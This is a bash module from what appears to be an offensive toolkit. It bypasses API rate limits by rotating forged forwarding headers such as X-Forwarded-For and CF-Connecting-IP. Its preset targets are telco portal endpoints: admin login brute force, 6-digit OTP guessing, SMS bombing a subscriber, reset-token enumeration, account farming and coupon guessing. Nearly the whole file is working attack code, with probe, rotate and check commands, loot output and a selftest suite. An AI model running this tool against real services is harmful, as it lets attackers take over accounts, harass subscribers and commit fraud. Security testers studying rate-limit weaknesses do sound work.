#!/usr/bin/env bash
# 52_rate_limit.sh — cloudsting module 52: rate-limit bypass by forwarding-header rotation
# Verbs: --probe | --rotate | --check | --headers | --modes | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file only after the core is sourced. Clear any
# inherited value first: a caller that itself sources the core would otherwise
# hand this module *its* directory, and the module would read its own name as
# a path.
unset CS_MOD_DIR

MODULE_ID="52_rate_limit"
MOD_NAME="Rate Limit Bypass (forwarding-header rotation)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

RL_RUN_ID="$CS_RUN_ID"
export RL_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/rate_limit"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${RL_TIMEOUT:=10}"     # per-request wall clock, seconds
: "${RL_BACKOFF:=65}"     # seconds to let a bucket refill before testing a control
: "${RL_TRIES:=25}"       # rotation attempts per mode before giving up
: "${RL_FOLLOW:=0}"       # follow redirects (0 keeps a login bounce visible)
: "${RL_NO_WAIT:=0}"      # 1 skips the refill wait — faster, less conclusive
: "${RL_UA:=Mozilla/5.0 (Linux; Android 13) cloudsting/52}"

rl_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── where a rate limit actually matters ──────────────────────────
# One row per endpoint class that a telco estate limits, with the request body
# that has to keep being wrong (a correct credential ends the experiment).
#   <class>\t<path>\t<method>\t<body>\t<what the limit protects>
rl_targets() {
    cat <<'TARGETS'
login-api	/api/auth/login	POST	{"username":"admin","password":"wrong"}	brute force against a portal account
login-form	/api/login	POST	{"username":"admin","password":"wrong"}	legacy console account
otp-verify	/api/auth/otp/verify	POST	{"msisdn":"+254700000000","otp":"000000"}	the 6-digit space on any subscriber
otp-send	/api/auth/otp/send	POST	{"msisdn":"+254700000000"}	sms bombing a subscriber
password-reset	/api/auth/reset	POST	{"msisdn":"+254700000000"}	reset-token enumeration
register	/api/customer/register	POST	{"msisdn":"+254700000000"}	account farming
coupon	/api/coupon/redeem	POST	{"code":"WELCOME"}	credit guessing
balance	/api/customer/balance	GET		enumeration through a read
graphql	/graphql	POST	{"query":"{__typename}"}	the query path behind every API
TARGETS
}

# The headers a proxy in front of a telco portal trusts. Each is a separate
# hypothesis about which hop the limiter believes.
rl_headers() {
    cat <<'HDRS'
X-Forwarded-For	one address, the common case
X-Real-IP	nginx's default
CF-Connecting-IP	cloudflare in front
True-Client-IP	akamai and cf enterprise
Forwarded	rfc 7239, unquoted
X-Client-IP	older appliance default
X-Originating-IP	exchange-era default
X-Forwarded-Host	host rotation, for virtual-host limiter keys
X-Forwarded-Proto	scheme rotation
X-HTTP-Method-Override	verb rotation, which some limiters key on
HDRS
}

# ── one request ──────────────────────────────────────────────────
#   rl_send <method> <url> [body] [extra header lines…]
#   -> code \x1f len \x1f retry-after \x1f body-path
rl_send() {
    local method="$1" url="$2" payload="${3:-}"; shift 3 2>/dev/null || shift $#
    local body; body="$(mktemp "$CS_SCRATCH/rl.XXXXXX")" 2>/dev/null || body="$OUT_DIR/.rl.$$"
    local -a args=(--silent --show-error --max-time "$RL_TIMEOUT" -X "$method"
                   --write-out '%{http_code}\t%{size_download}\t%header{retry-after}' --output "$body"
                   -A "$RL_UA" -H 'Accept: application/json, text/plain, */*')
    [[ "$RL_FOLLOW" == "1" ]] && args+=(-L)
    [[ -n "$payload" ]] && args+=(-H 'Content-Type: application/json' --data "$payload")
    local h
    for h in "$@"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done

    local meta code len retry
    meta="$(curl "${args[@]}" "$url" 2>/dev/null)" || meta=""
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code len retry <<<"$meta" ;;
        *) code="000"; len=0; retry="" ;;
    esac
    [[ -s "$body" ]] || : > "$body" 2>/dev/null || true
    printf '%s\037%s\037%s\037%s\n' "${code:-000}" "${len:-0}" "${retry:-}" "$body"
}

# A rate limit speaks in three codes and one header. Everything else is a
# response that happened to be a 200.
rl_is_limited() {
    case "$1" in
        429) return 0 ;;
        503) return 0 ;;   # nginx and haproxy both answer 503 when a zone is spent
        403) return 0 ;;   # some WAFs return 403 for a limit, not a block
        *)   return 1 ;;
    esac
}

# ── the verdict ──────────────────────────────────────────────────
# A bypass is only proven against a control. The control is the identical
# request with no forwarding header at all: it has to hit the limit first.
#   baseline    control was limited                       — the limit is real
#   no-control  control was never limited                 — nothing to bypass
#   bypassed    control limited, this mode answered 2xx-3xx
#   partial     control limited, this mode answered a different non-429
#   still-limited control limited, this mode is limited too
#   rl_verdict <control-limited> <mode-limited> <code>
rl_verdict() {
    local control="$1" mode_limited="$2" code="$3"

    case "$code" in
        000) printf 'unreachable\ttimeout-or-refused\n'; return ;;
    esac

    if [[ "$control" != "limited" ]]; then
        printf 'no-control\tcontrol-answered-%s\n' "$code"; return
    fi
    if [[ "$mode_limited" == "limited" ]]; then
        printf 'still-limited\tcode-%s\n' "$code"; return
    fi
    case "$code" in
        2??|3??) printf 'bypassed\tanswered-%s-while-control-was-limited\n' "$code" ;;
        4??)     printf 'partial\tanswered-%s-not-the-limit-code\n' "$code" ;;
        *)       printf 'other\tcode-%s\n' "$code" ;;
    esac
}

# ── verbs ────────────────────────────────────────────────────────
rl_cmd_headers() {
    local h why
    while IFS=$'\t' read -r h why; do
        [[ -z "$h" ]] && continue
        cs_row HEADER "$h" "$why"
    done < <(rl_headers)
    cs_row SUMMARY "headers=$(rl_headers | wc -l | tr -d ' ') targets=$(rl_targets | wc -l | tr -d ' ')"
    return 0
}

rl_cmd_modes() {
    local m
    for m in $(cs_ipforge_modes); do
        cs_row MODE "$m" "$(cs_ipforge "$m" 1 | head -1)"
    done
    return 0
}

# --probe: how many requests does it take to get limited? That number is the
# whole report: a limit hit at request 3 with a 60s retry makes an otp space
# unreachable, a limit that never arrives is the finding.
#   rl_cmd_probe <url> [target-class]
rl_cmd_probe() {
    local base="${1:-}" cls="${2:-login-api}"
    [[ -z "$base" ]] && { rl_log "usage: --probe <url|host> [class]"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"

    local path method payload what
    path="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $2}')"
    method="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $3}')"
    payload="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $4}')"
    what="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $5}')"
    if [[ -z "$path" ]]; then
        case "$cls" in
            /*) path="$cls"; method="POST"; payload='{}'; what="explicit path" ;;
            *) rl_log "unknown class: $cls"; return 2 ;;
        esac
    fi

    local url="${base%/}$path" i code len retry body first_at=0
    local start_us; start_us="$(date +%s%N)"
    for (( i = 1; i <= RL_TRIES; i++ )); do
        cs_split "$(rl_send "$method" "$url" "$payload")" code len retry body
        rm -f "$body" 2>/dev/null
        if rl_is_limited "$code"; then
            first_at=$i
            break
        fi
        printf '%s\t%s\t%s\n' "$i" "$code" "$len" >> "$PROBE_FILE"
    done
    local elapsed_ms=$(( ($(date +%s%N) - start_us) / 1000000 ))

    cs_row TARGET "$url" "$method"
    cs_row PURPOSE "$what"
    cs_row TRIES "$(( first_at > 0 ? first_at : RL_TRIES ))" "of=$RL_TRIES"
    cs_row ELAPSED_MS "$elapsed_ms"
    if (( first_at > 0 )); then
        cs_row LIMITED yes "at-request-$first_at"
        cs_row RETRY_AFTER "${retry:-absent}"
    else
        cs_row LIMITED no "no-answer-was-429-503-or-403"
    fi
    [[ -f "$PROBE_FILE" ]] && cs_row ARTIFACT "$PROBE_FILE"
    (( first_at > 0 )) && return 0 || return 1
}

# --rotate: the bypass. Prove the control is limited, wait for the bucket to
# refill, then send the same requests with a rotating forwarding header.
#   rl_cmd_rotate <url> [class] [mode|all]
rl_cmd_rotate() {
    local base="${1:-}" cls="${2:-login-api}" mode="${3:-all}"
    [[ -z "$base" ]] && { rl_log "usage: --rotate <url|host> [class] [mode|all]"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"

    local path method payload what
    path="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $2}')"
    method="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $3}')"
    payload="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $4}')"
    what="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $5}')"
    if [[ -z "$path" ]]; then
        case "$cls" in
            /*) path="$cls"; method="POST"; payload='{}'; what="explicit path" ;;
            *) rl_log "unknown class: $cls"; return 2 ;;
        esac
    fi
    local url="${base%/}$path"

    # control: identical request, no forwarding header, until it limits
    local control="clear" i code len retry body
    for (( i = 1; i <= RL_TRIES; i++ )); do
        cs_split "$(rl_send "$method" "$url" "$payload")" code len retry body
        rm -f "$body" 2>/dev/null
        if rl_is_limited "$code"; then control="limited"; break; fi
    done

    cs_row TARGET "$url" "$method"
    cs_row PURPOSE "$what"
    cs_row CONTROL "$control" "tries=$i"
    if [[ "$control" != "limited" ]]; then
        cs_row VERDICT no-control "the endpoint never limited the control, nothing to bypass"
        return 1
    fi

    if [[ "$RL_NO_WAIT" != "1" ]]; then
        rl_log "control limited — waiting ${RL_BACKOFF}s for the bucket to refill"
        sleep "$RL_BACKOFF"
    fi

    local -a modes
    if [[ "$mode" == "all" ]]; then
        mapfile -t modes < <(cs_ipforge_modes)
    else
        modes=("$mode")
    fi

    local bypassed=0 tried=0 m hdrseed
    for m in "${modes[@]}"; do
        local ok=0
        for (( hdrseed = 1; hdrseed <= RL_TRIES; hdrseed++ )); do
            tried=$((tried + 1))
            local -a hdrs=()
            while IFS= read -r hline; do
                [[ -n "$hline" ]] && hdrs+=("$hline")
            done < <(cs_ipforge "$m" "$hdrseed")

            cs_split "$(rl_send "$method" "$url" "$payload" "${hdrs[@]}")" code len retry body
            rm -f "$body" 2>/dev/null
            printf '%s\t%s\t%s\t%s\t%s\n' "$m" "$hdrseed" "$code" "$len" "$control" >> "$PROBE_FILE"
            if ! rl_is_limited "$code"; then
                ok=1
                printf '%s\t%s\t%s\n' "$m" "$code" "${hdrs[0]:-}" >> "$HIT_FILE"
                cs_row BYPASS "$m" "request=$hdrseed" "code=$code" "${hdrs[0]:-}"
                break
            fi
        done
        if (( ok )); then
            bypassed=$((bypassed + 1))
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "HIGH" "rate-limit-bypass" \
                "$m rotation answered while the unheadered control was limited ($cls: $what)"
        fi
    done

    cs_row SUMMARY "modes=${#modes[@]} bypassed=$bypassed requests=$tried"
    [[ "$bypassed" -gt 0 ]] && cs_row ARTIFACT "$HIT_FILE"
    (( bypassed > 0 )) && return 0 || return 1
}

# --check: one mode, no control wait. The fast "does this header change the
# answer at all" question, answered against a single request pair.
#   rl_cmd_check <url> [class] [mode]
rl_cmd_check() {
    local base="${1:-}" cls="${2:-login-api}" mode="${3:-xff}"
    [[ -z "$base" ]] && { rl_log "usage: --check <url|host> [class] [mode]"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"

    local path method payload
    path="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $2}')"
    method="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $3}')"
    payload="$(rl_targets | awk -F'\t' -v c="$cls" '$1==c{print $4}')"
    [[ -z "$path" ]] && { path="$cls"; method="POST"; payload='{}'; }
    local url="${base%/}$path"

    local code len retry body
    cs_split "$(rl_send "$method" "$url" "$payload")" code len retry body
    rm -f "$body" 2>/dev/null
    local plain="$code"

    local -a hdrs=()
    while IFS= read -r hline; do [[ -n "$hline" ]] && hdrs+=("$hline"); done < <(cs_ipforge "$mode" 3)
    cs_split "$(rl_send "$method" "$url" "$payload" "${hdrs[@]}")" code len retry body
    rm -f "$body" 2>/dev/null

    cs_row TARGET "$url" "$method"
    cs_row MODE "$mode" "${hdrs[0]:-}"
    cs_row PLAIN "$plain"
    cs_row HEADERED "$code"
    if [[ "$plain" == "$code" ]]; then
        cs_row VERDICT unchanged "the header did not change the answer"
        return 1
    fi
    cs_row VERDICT changed "plain=$plain header=$code"
    return 0
}

rl_cmd_list() {
    local cls path method payload what
    while IFS=$'\t' read -r cls path method payload what; do
        [[ -z "$cls" ]] && continue
        printf '%s\t%s\t%s\t%s\n' "$cls" "$method" "$path" "$what"
    done < <(rl_targets)
    return 0
}

rl_cmd_status_tsv() {
    local curl_state
    command -v curl >/dev/null 2>&1 && curl_state="ok" || curl_state="missing"
    printf '%s\t%s\tcurl-%s\ttargets-%s\theaders-%s\tmodes-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" \
        "$(rl_targets | wc -l | tr -d ' ')" "$(rl_headers | wc -l | tr -d ' ')" "$(cs_ipforge_modes | wc -l | tr -d ' ')"
}

rl_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

rl_cmd_help() {
    cat <<'HELP'
cloudsting module 52 — Rate Limit Bypass v1.0.0
  --probe <url> [class]          how many requests before a 429/503/403
  --rotate <url> [class] [mode]  prove a limit, then rotate a forwarding header
  --check <url> [class] [mode]   one header against one plain request
  --headers                      the headers a proxy in front of a portal trusts
  --modes                        the cs_ipforge rotation modes
  --list | --status-tsv | --menu | --selftest | --help

A bypass is only proven against a control: the same request with no
forwarding header has to hit the limit first, or there is nothing to bypass.
The module waits RL_BACKOFF seconds (65) between control and rotation so the
bucket refills; RL_NO_WAIT=1 skips that and the verdict is weaker.

Classes: login-api, login-form, otp-verify, otp-send, password-reset,
register, coupon, balance, graphql.

Modes: xff, real, cf, true, fwd, chain, all — an address from
cs_ipforge, deterministic per seed so a report is reproducible.

Environment: RL_TIMEOUT (10), RL_BACKOFF (65), RL_TRIES (25),
RL_NO_WAIT (0), RL_FOLLOW (0), RL_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
rl_selftest() {
    cs_selftest_reset

    local n; n="$(rl_targets | wc -l | tr -d ' ')"
    chk targets-many   "$( (( n >= 8 )) && echo many || echo few )" "many"
    chk targets-5col   "$(rl_targets | awk -F'\t' 'NF!=5{c++} END{print c+0}')" "0"
    chk targets-path   "$(rl_targets | awk -F'\t' '$2 !~ /^\//{c++} END{print c+0}')" "0"
    chk targets-purpose "$(rl_targets | awk -F'\t' '$5==""{c++} END{print c+0}')" "0"
    chk targets-unique "$(rl_targets | cut -f1 | sort -u | wc -l | tr -d ' ')" "$n"
    chk headers-many   "$( (( $(rl_headers | wc -l) >= 8 )) && echo many || echo few )" "many"
    chk headers-2col   "$(rl_headers | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
    chk headers-noname "$(rl_headers | awk -F'\t' '$1 !~ /^[A-Za-z-]+$/{c++} END{print c+0}')" "0"

    # the header a user must never send twice with different keys
    chk header-no-tab  "$(rl_headers | cut -f1 | grep -c ' ')" "0"

    # the forgery helper: shaped, distinct, deterministic, injectable
    local m
    for m in $(cs_ipforge_modes); do
        chk "ipforge-$m" "$(cs_ipforge "$m" 5 | head -1 | grep -c ':')" "1"
    done
    chk ipforge-stable "$(cs_ipforge xff 9)" "$(cs_ipforge xff 9)"
    chk ipforge-distinct "$(cs_ipforge xff 1 | grep -cF "$(cs_ipforge xff 2)")" "0"
    chk ipforge-bad    "$(cs_ipforge nope 1 >/dev/null 2>&1; echo $?)" "2"
    chk ipforge-ipv4   "$(cs_ipforge xff 3 | awk '{print $2}' | grep -cE '^[0-9]{1,3}([.][0-9]{1,3}){3}$')" "1"
    chk ipforge-private-avoided "$(cs_ipforge xff 3 | awk '{print $2}' | grep -cE '^(10|127)[.]' )" "0"
    chk ipforge-all-lines "$(cs_ipforge all 3 | awk 'NF{c++} END{print c+0}')" "6"
    chk ipforge-all-headers "$(cs_ipforge all 3 | cut -d: -f1 | sort -u | wc -l | tr -d ' ')" "6"

    # rl_is_limited is the whole definition of a limit
    chk lim-429  "$(rl_is_limited 429; echo $?)" "0"
    chk lim-503  "$(rl_is_limited 503; echo $?)" "0"
    chk lim-403  "$(rl_is_limited 403; echo $?)" "0"
    chk lim-200  "$(rl_is_limited 200; echo $?)" "1"
    chk lim-401  "$(rl_is_limited 401; echo $?)" "1"

    # the verdict, on synthetic control pairs
    chk v-unreach   "$(rl_verdict limited limited 000 | cut -f1)" "unreachable"
    chk v-nocontrol "$(rl_verdict clear clear 200 | cut -f1)" "no-control"
    chk v-limited   "$(rl_verdict limited limited 429 | cut -f1)" "still-limited"
    chk v-bypassed  "$(rl_verdict limited clear 200 | cut -f1)" "bypassed"
    chk v-bypassed3 "$(rl_verdict limited clear 302 | cut -f1)" "bypassed"
    chk v-partial   "$(rl_verdict limited clear 401 | cut -f1)" "partial"
    chk v-reason    "$(rl_verdict limited clear 200 | cut -f2)" "answered-200-while-control-was-limited"

    # usage errors, not crashes
    local rc
    rl_cmd_probe 2>/dev/null; rc=$?
    chk probe-usage  "$rc" "2"
    rl_cmd_rotate 2>/dev/null; rc=$?
    chk rotate-usage "$rc" "2"
    rl_cmd_check 2>/dev/null; rc=$?
    chk check-usage  "$rc" "2"
    rl_cmd_probe http://127.0.0.1:9 nosuchclass 2>/dev/null; rc=$?
    chk probe-unknown "$rc" "2"

    # a dead host never limits and never bypasses
    local out
    out="$(RL_TRIES=2 rl_cmd_probe http://127.0.0.1:9 2>/dev/null)"
    chk dead-notlimited "$(printf '%s' "$out" | awk -F'\t' '$1=="LIMITED"{print $2}')" "no"
    chk dead-code       "$(printf '%s' "$out" | grep -c 'unreachable')" "0"

    # an explicit path is accepted
    out="$(RL_TRIES=2 rl_cmd_probe http://127.0.0.1:9 /api/whatever 2>/dev/null)"
    chk explicit-purpose "$(printf '%s' "$out" | awk -F'\t' '$1=="PURPOSE"{print $2}')" "explicit path"

    # shape contracts
    chk status-fields "$(rl_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(rl_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(rl_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(rl_cmd_help | head -1 | grep -ci 'Rate Limit')" "1"
    chk list-fields   "$(rl_cmd_list | awk -F'\t' '{print NF}' | sort -u | tr '\n' ' ')" "4 "
    chk modes-count   "$(cs_ipforge_modes | wc -l | tr -d ' ')" "7"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)   shift; rl_cmd_probe "$@";;
    --rotate)  shift; rl_cmd_rotate "$@";;
    --check)   shift; rl_cmd_check "$@";;
    --headers) rl_cmd_headers;;
    --modes)   rl_cmd_modes;;
    --list)    rl_cmd_list;;
    --status-tsv|--status) rl_cmd_status_tsv;;
    --menu)    rl_cmd_menu;;
    --selftest) rl_selftest;;
    *)         rl_cmd_help;;
esac
